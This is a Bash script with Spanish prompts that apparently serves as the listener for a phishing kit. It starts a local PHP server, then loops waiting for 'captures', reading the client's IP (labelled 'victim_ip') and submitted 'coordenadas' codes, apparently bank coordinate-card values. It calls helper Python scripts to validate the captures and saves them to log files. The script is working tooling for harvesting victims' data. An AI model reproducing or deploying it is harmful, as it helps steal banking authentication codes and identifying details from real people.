#!/bin/bash
##COLOUR TEXT
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
LGRAY="\e[37m"
GRAY="\e[90m"
LRED="\e[91m"
LGREEN="\e[92m"
LYELLOW="\e[93m"
LBLUE="\e[94m"
LMAGENTA="\e[95m"
LCYAN="\e[96m"
WHITE="\e[97m"
NC="\e[0m" #Reset colour

##COLOUR BG
BLACKBG="\e[40m"
REDBG="\e[41m"
GREENBG="\e[42m"
YELLOWBG="\e[43m"
BLUEBG="\e[44m"
MAGENTABG="\e[45m"
CYANBG="\e[46m"
LGRAYBG="\e[47m"
GRAYBG="\e[100m"
LREDBG="\e[101m"
LGREENBG="\e[102m"
LYELLOWBG="\e[103m"
LBLUEBG="\e[104m"
LMAGENTABG="\e[105m"
LCYANBG="\e[106m"
WHITEBG="\e[107m"
RESETBG="\e[0m\n" #Reset background

## COLOUR FONT - BOLD
BOLDBLACK="\e[1;30m"
BOLDRED="\e[1;31m"
BOLDGREEN="\e[1;32m"
BOLDYELLOW="\e[1;33m"
BOLDBLUE="\e[1;34m"
BOLDMAGENTA="\e[1;35m"
BOLDCYAN="\e[1;36m"
BOLDLGRAY="\e[1;37m"
BOLDGRAY="\e[1;90m"
BOLDLRED="\e[1;91m"
BOLDLGREEN="\e[1;92m"
BOLDLYELLOW="\e[1;93m"
BOLDLBLUE="\e[1;94m"
BOLDLMAGENTA="\e[1;95m"
BOLDLCYAN="\e[1;96m"
BOLDWHITE="\e[1;97m"
## COLOUR FONT - FAINT
FAINTBLACK="\e[2;30m"
FAINTRED="\e[2;31m"
FAINTGREEN="\e[2;32m"
FAINTYELLOW="\e[2;33m"
FAINTBLUE="\e[2;34m"
FAINTMAGENTA="\e[2;35m"
FAINTCYAN="\e[2;36m"
FAINTLGRAY="\e[2;37m"
FAINTGRAY="\e[2;90m"
FAINTLRED="\e[2;91m"
FAINTLGREEN="\e[2;92m"
FAINTLYELLOW="\e[2;93m"
FAINTLBLUE="\e[2;94m"
FAINTLMAGENTA="\e[2;95m"
FAINTLCYAN="\e[2;96m"
FAINTWHITE="\e[2;97m"
## COLOUR FONT - ITALIC
ITALICBLACK="\e[3;30m"
ITALICRED="\e[3;31m"
ITALICGREEN="\e[3;32m"
ITALICYELLOW="\e[3;33m"
ITALICBLUE="\e[3;34m"
ITALICMAGENTA="\e[3;35m"
ITALICCYAN="\e[3;36m"
ITALICLGRAY="\e[3;37m"
ITALICGRAY="\e[3;90m"
ITALICLRED="\e[3;91m"
ITALICLGREEN="\e[3;92m"
ITALICLYELLOW="\e[3;93m"
ITALICLBLUE="\e[3;94m"
ITALICLMAGENTA="\e[3;95m"
ITALICLCYAN="\e[3;96m"
ITALICWHITE="\e[3;97m"
## COLOUR FONT - UNDERLINE
ULBLACK="\e[4;30m"
ULRED="\e[4;31m"
ULGREEN="\e[4;32m"
ULYELLOW="\e[4;33m"
ULBLUE="\e[4;34m"
ULMAGENTA="\e[4;35m"
ULCYAN="\e[4;36m"
ULLGRAY="\e[4;37m"
ULGRAY="\e[4;90m"
ULLRED="\e[4;91m"
ULLGREEN="\e[4;92m"
ULLYELLOW="\e[4;93m"
ULLBLUE="\e[4;94m"
ULLMAGENTA="\e[4;95m"
ULLCYAN="\e[4;96m"
ULWHITE="\e[4;97m"
##RESET ALL FONT AND COLOUR
NF="\e[0;0m" 
NA="${NC}${NF}"

rm -rf .coords_deneg >/dev/null 2>&1
rm -rf .deneg_coords >/dev/null 2>&1
rm -rf sesion.txt >/dev/null 2>&1
rm -rf ip.txt >/dev/null 2>&1
rm -rf .mic >/dev/null 2>&1

vc() {

mm=$(grep -oE '\(.*' ip.txt | head -1 | cut -d ')' -f1 | sed 's/(//g' | tr -d '\r') 

cod=$(grep -E '[0-9]{1,}' .mic | tail -1 | awk '{print $3}' | tr -d '\r')
if [[ -z "$cod" ]]; then  
if [[ -e ".coords_deneg" ]]; then
echo "Ok" >/dev/null 2>&1
echo "[-] Coordenadas Denegadas..." >> .deneg_coords
else
grep -E 'Denegadas' sesion.txt | tail -1 > .coords_deneg
echo "[-] Esperando coordenadas del cliente..." > .coords_deneg
#tail -n 1 sesion.txt
cat .coords_deneg
capture_ip
echo $ip
echo $mm
rm -rf sesion.txt >/dev/null 2>&1
fi

if [[ -e ".deneg_coords" ]]; then
echo "Ok" >/dev/null 2>&1
verif=$(wc -l .deneg_coords)
fi
fi 

if [[ ! -z "$mm" ]]; then  
if [[ "$verif" =~ "1" ]]; then 
tail -n 1 .deneg_coords 
capture_ip
echo $ip
echo $mm 
fi
fi

}


capture_ip() {

if [[ -e ip.txt ]]; then
dos2unix ip.txt >/dev/null 2>&1
	IP=$(grep -a 'IP:' ip.txt | sed -n "1p" | cut -d " " -f2 | tr -d '\r')
victim_ip=${IP}
	ip=$(echo -en "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE} CLIENT IP : ${victim_ip}${RESETBG}${NA}")
fi

if [[ -e ip.txt ]]; then
mm=$(grep -oE '\(.*' ip.txt | head -1 | cut -d ')' -f1 | sed 's/(//g')
if [ "$mm" == "" ]; then
	dos2unix ip.txt >/dev/null 2>&1
	IP=$(grep -a 'IP:' ip.txt | sed -n "1p" | cut -d " " -f2 | tr -d '\r')
	victim_ip=${IP}
	#rm -rf ip.txt
	ip=$(echo -en "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE} CLIENT IP : ${victim_ip}${RESETBG}${NA}")
	    sleep 1
fi
fi
}

capture_data_notp() {

echo -e "\n${RED}[${WHITE}*${RED}]${YELLOW} Esparando capturas, ${BLUE}Ctrl+C ${YELLOW}${BLUE}[${WHITE}salir${BLUE}]${WHITE}."

function handler() 
{
  echo -e "  ${YELLOW}Cierre de procesos${WHITE}"
  rm -rf .coords_deneg >/dev/null 2>&1
  rm -rf .deneg_coords >/dev/null 2>&1
  rm -rf sesion.txt >/dev/null 2>&1
  rm -rf ip.txt >/dev/null 2>&1
  rm -rf .mic >/dev/null
  exit 1
}

# $$ is a special variable that returns process ID of current  
# process/script 
#echo My process ID is $$ 

# handler is the name of the signal handler function for SIGINT signal 
trap 'handler' SIGINT
while true
do

if [[ -e "sesion.txt" ]]; then 
python bdigit.py > .mic
vmc=$(grep -E '[0-9]{1,}' .mic | tail -1 | awk '{print $3}' | tr -d '\r')
fi

if [[ "$vmc" =~ ^[0-9]+$ ]]; then 
echo "Ok" >/dev/null 2>&1
else
if [[ -e "sesion.txt" ]]; then 
python bdigit.py > .mic
vmc=$(grep -E '[0-9]{1,}' .mic | tail -1 | awk '{print $3}' | tr -d '\r')
fi
fi


if [[ -e "ip.txt" ]]; then
mm=$(grep -oE '\(.*' ip.txt | head -1 | cut -d ')' -f1 | sed 's/(//g' | tr -d '\r') 
cod=$(grep -E '[0-9]{1,}' sesion.txt | tail -1 | awk '{print $3}')
if [[ "$cod" != "" ]]; then
log_name=$(date +%d-%m-%Y-%H-%M-%S)
capture_ip
echo -e "$ip\n"
mkdir -p logs/ipma
python validar.py
echo -e "${RED}[${WHITE}+${RED}]${YELLOW}${GREEN} Saved in : ${LBLUE}logs/${log_name}.txt"
echo -e "\n${RED}[${WHITE}*${RED}]${YELLOW} Esparando capturas, ${BLUE}Ctrl+C ${YELLOW}${BLUE}[${WHITE}salir${BLUE}]${WHITE}."
else
vc
rm -rf sesion.txt >/dev/null 2>&1
rm -rf ip.txt >/dev/null 2>&1
fi
fi

done
}


port=1
# Bucle while
while [ "$port" = "1" ];
do
echo -e ""
printf "${YELLOW}[${WHITE}*${YELLOW}]${GREEN} Elige port de 4 digitos! > ${WHITE}"
read choose_port
cc=$(echo -n "$choose_port" | wc -c)


while [ -z $choose_port ]; do 
printf "${YELLOW}[${WHITE}*${YELLOW}]${GREEN} Elige port de 4 digitos! > ${WHITE}"
read choose_port
cc=$(echo -n "$choose_port" | wc -c)
done

choose_port="${choose_port:-${default_choose_port}}"
if [[ "$choose_port" =~ ^[0-9]+$ ]] && [ "$cc" -ge 4 ] && [ "$cc" -le 4 ]; then
port="$choose_port"
printf "${YELLOW}[${WHITE}*${YELLOW}]${GREEN} Starting php server...\n"
ip=$(ip -o address | grep 'inet.[0-9]' | tail -n 1 | awk '{print $4}')
IP=$(echo ${ip%%/*})
php -S localhost:${port} > /dev/null 2>&1 &
echo -en "\e[1;77m\e[0m"
echo -en "\e[1;77m\e[0m"
echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Servidor corriendo en: ${BLUE}localhost:${port}"
capture_data_notp
else
port=1
fi
done

